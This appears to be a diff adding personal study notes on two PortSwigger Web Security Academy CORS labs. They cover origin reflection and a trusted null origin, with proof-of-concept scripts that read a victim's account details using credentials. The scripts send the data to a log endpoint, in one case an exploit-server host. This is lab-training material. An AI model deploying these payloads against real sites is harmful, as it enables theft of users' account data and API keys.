@@ -7,6 +7,33 @@ Date: Mon 12/12/2022
 
 A) CORS vulnerability with basic origin reflection
 
-    
+    When we try to test CORS we will see the response if it contains the acess-control-allow-origin or acess-control-allow-credentials header. if it have that we will try to use the origin header on the request and try to see if he pass or block it. if it pass we can exploit it with some CORS POC scripts
+       
+                <script>
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+            req.withCredentials = true;
+            req.send();
 
+            function reqListener() {
+                location='/log?key='+this.responseText;
+            };
+            </script>
+
+
+B) CORS vulnerability with trusted null origin
+
+    Thanks to developers they have forgoted 'null' by whitelisting it for local work. so first, we will try to add origin: example.con then we will try origin: * but when we try origin: null  it will responde with so Access-Control-Allow-Origin: null boom! we just need to run CORS POC script.
+
+                <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+            req.withCredentials = true;
+            req.send();
+            function reqListener() {
+                location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+            };
+            </script>"></iframe>
 
